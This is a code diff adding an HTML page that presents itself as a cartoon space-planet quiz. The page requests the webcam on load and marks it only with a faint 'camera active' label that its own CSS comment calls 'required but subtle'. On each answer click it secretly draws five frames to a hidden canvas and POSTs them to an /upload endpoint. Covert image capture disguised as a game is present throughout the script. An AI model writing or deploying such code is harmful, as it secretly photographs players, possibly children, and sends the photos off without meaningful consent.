@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Cartoon Space Adventure</title>
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  background: radial-gradient(circle at center, #0a0e2f, #020314);
+  height: 100vh;
+  width: 100vw;
+  overflow: hidden;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-family: 'Poppins', sans-serif;
+  color: white;
+}
+
+/* twinkling stars */
+.stars {
+  width: 100%;
+  height: 100%;
+  position: absolute;
+  background: url('https://i.imgur.com/7VbY6wE.png');
+  background-size: cover;
+  opacity: 0.4;
+  animation: twinkle 6s linear infinite;
+}
+
+@keyframes twinkle {
+  0% { opacity: .4; }
+  50% { opacity: .7; }
+  100% { opacity: .4; }
+}
+
+/* GAME CARD */
+#game-card {
+  width: 95%;
+  max-width: 480px;
+  background: rgba(255, 255, 255, 0.08);
+  padding: 25px;
+  border-radius: 20px;
+  text-align: center;
+  backdrop-filter: blur(10px);
+  box-shadow: 0 0 25px rgba(0, 150, 255, 0.3);
+  z-index: 5;
+  animation: fadeIn 0.5s ease-out;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: scale(0.9); }
+  to { opacity: 1; transform: scale(1); }
+}
+
+/* SCORE BADGE */
+#score-badge {
+  position: absolute;
+  top: 15px;
+  right: 15px;
+  background: #4aa3ff;
+  padding: 10px 16px;
+  border-radius: 25px;
+  font-weight: 700;
+  box-shadow: 0 0 12px #4aa3ff;
+  animation: pop 0.3s ease-out;
+}
+
+@keyframes pop {
+  0% { transform: scale(0.6); }
+  100% { transform: scale(1); }
+}
+
+/* CAMERA ORB */
+#camera-orb {
+  position: absolute;
+  top: 15px;
+  left: 15px;
+  width: 70px;
+  height: 70px;
+  border-radius: 50%;
+  overflow: hidden;
+  box-shadow: 0 0 12px #6bc6ff, 0 0 25px #4aa3ff inset;
+  background: rgba(255, 255, 255, 0.1);
+  z-index: 50;
+}
+
+#video {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+/* SMALL CAMERA NOTICE (required but subtle) */
+#camera-note {
+  font-size: 0.6rem;
+  opacity: 0.55;
+  margin-top: 2px;
+  text-align: center;
+}
+
+/* QUESTION */
+.question {
+  margin-top: 20px;
+  font-size: 1.4rem;
+  font-weight: 600;
+}
+
+/* OPTIONS */
+.options {
+  margin-top: 25px;
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 14px;
+}
+
+.option {
+  background: rgba(255, 255, 255, 0.15);
+  padding: 14px;
+  border-radius: 15px;
+  cursor: pointer;
+  transition: 0.2s;
+  font-size: 1rem;
+}
+
+.option:hover {
+  transform: translateY(-4px);
+  background: rgba(255, 255, 255, 0.25);
+}
+
+/* CARTOON PLANET ICON */
+.planet-icon {
+  width: 50px;
+  height: 50px;
+  margin-bottom: 6px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="stars"></div>
+
+<!-- CAMERA ORB -->
+<div id="camera-orb">
+  <video id="video" autoplay playsinline muted></video>
+</div>
+<div id="camera-note">camera active</div>
+
+<!-- SCORE BADGE -->
+<div id="score-badge">Score: 0</div>
+
+<!-- GAME CARD -->
+<div id="game-card"></div>
+
+<!-- HIDDEN CANVAS -->
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+let video = document.getElementById("video");
+let canvas = document.getElementById("canvas");
+let scoreBadge = document.getElementById("score-badge");
+let gameCard = document.getElementById("game-card");
+
+let cameraReady = false;
+let score = 0;
+
+/* -------------------------------------------
+   CAMERA PERMISSION ON LOAD
+-------------------------------------------- */
+window.onload = requestCamera;
+
+async function requestCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+
+    video.addEventListener("loadeddata", () => {
+      cameraReady = true;
+    });
+
+  } catch (err) {
+    alert("Camera access is required for this experience.");
+  }
+}
+
+/* -------------------------------------------
+   TAKE 5 PHOTOS
+-------------------------------------------- */
+function captureFiveImages() {
+  if (!cameraReady) return;
+
+  let count = 0;
+  const interval = setInterval(() => {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+
+    const imgData = canvas.toDataURL("image/png");
+
+    fetch("/upload", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ image: imgData })
+    });
+
+    count++;
+    if (count >= 5) clearInterval(interval);
+  }, 350);
+}
+
+/* -------------------------------------------
+   GAME DATA (6 Cartoon Questions)
+-------------------------------------------- */
+const questions = [
+  {
+    text: "Which is the largest planet?",
+    correct: "Jupiter",
+    options: ["Earth", "Mars", "Jupiter", "Venus"]
+  },
+  {
+    text: "Which planet is known as the Red Planet?",
+    correct: "Mars",
+    options: ["Mercury", "Mars", "Saturn", "Neptune"]
+  },
+  {
+    text: "Which planet has rings?",
+    correct: "Saturn",
+    options: ["Venus", "Earth", "Saturn", "Pluto"]
+  },
+  {
+    text: "Which planet is closest to the Sun?",
+    correct: "Mercury",
+    options: ["Mercury", "Mars", "Uranus", "Jupiter"]
+  },
+  {
+    text: "Which planet is famous for big storms?",
+    correct: "Jupiter",
+    options: ["Earth", "Jupiter", "Neptune", "Mars"]
+  },
+  {
+    text: "Which planet is known as Earth's twin?",
+    correct: "Venus",
+    options: ["Venus", "Mars", "Mercury", "Neptune"]
+  }
+];
+
+let currentIndex = 0;
+
+/* -------------------------------------------
+   RENDER QUESTION
+-------------------------------------------- */
+function renderQuestion() {
+  const q = questions[currentIndex];
+
+  gameCard.innerHTML = `
+    <h2>🚀 Cartoon Space Adventure</h2>
+    <div class="question">${q.text}</div>
+
+    <div class="options">
+      ${q.options
+        .map(
+          opt => `
+        <div class="option" data-answer="${opt}">
+          <img class="planet-icon" src="https://img.icons8.com/color/96/planet.png" />
+          ${opt}
+        </div>`
+        )
+        .join("")}
+    </div>
+  `;
+
+  document.querySelectorAll(".option").forEach(opt => {
+    opt.onclick = () => handleAnswer(opt.dataset.answer);
+  });
+}
+
+/* -------------------------------------------
+   HANDLE ANSWER
+-------------------------------------------- */
+function handleAnswer(selected) {
+  const correct = questions[currentIndex].correct;
+
+  captureFiveImages();
+
+  if (selected === correct) {
+    score += 10;
+    scoreBadge.style.background = "#00d26a";
+  } else {
+    score -= 5;
+    scoreBadge.style.background = "#ff445a";
+  }
+
+  scoreBadge.innerText = "Score: " + score;
+
+  setTimeout(() => {
+    scoreBadge.style.background = "#4aa3ff";
+  }, 600);
+
+  currentIndex++;
+
+  if (currentIndex < questions.length) {
+    setTimeout(renderQuestion, 400);
+  } else {
+    showGameOver();
+  }
+}
+
+/* -------------------------------------------
+   GAME OVER SCREEN
+-------------------------------------------- */
+function showGameOver() {
+  gameCard.innerHTML = `
+    <h2>🎉 Adventure Complete!</h2>
+    <p>Your final score is:</p>
+    <h1 style="font-size:2.6rem; margin-top:10px;">${score}</h1>
+    <p>Great job, Space Explorer!</p>
+  `;
+}
+
+/* Start Game */
+renderQuestion();
+</script>
+
+</body>
+</html>
